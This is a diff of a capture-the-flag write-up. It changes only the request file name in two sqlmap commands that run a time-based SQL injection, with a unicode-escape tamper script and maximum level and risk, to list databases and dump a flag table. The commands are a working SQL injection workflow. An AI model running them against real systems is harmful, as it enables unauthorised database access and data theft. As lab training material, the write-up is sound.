@@ -80,7 +80,7 @@ now enter the POST code into a .txt and rwplace the payload placeholder with ```
 
 execuing time based sqli using  ```sqlmap``` to retrieve database.
 
-**sqlmap -r requestt.txt -tamper charunicodeescape -v 3 --batch --level=5 --risk=3 --threads=10 --technique=T --dbs --dbms=mysql**
+**sqlmap -r qw.txt -tamper charunicodeescape -v 3 --batch --level=5 --risk=3 --threads=10 --technique=T --dbs --dbms=mysql**
 
 
 <img src="Picture6.png">
@@ -97,7 +97,7 @@ lets retrive tables from db_m8452:
 db_m8452  has two tables, *definitely_not_a_flag* and *notes*. lets dump  *definitely_not_a_flag* (--dump).
 
 
-**sqlmap -r requestt.txt -tamper charunicodeescape -v 3 --batch --level=5 --risk=3 --threads=10 --technique=T -D db_m8452 -T definitely_not_a_flag --dump --dbms=mysql**
+**sqlmap -r qw.txt -tamper charunicodeescape -v 3 --batch --level=5 --risk=3 --threads=10 --technique=T -D db_m8452 -T definitely_not_a_flag --dump --dbms=mysql**
 
 after applying the time based sql inject. and many payloads later we got the flag
 
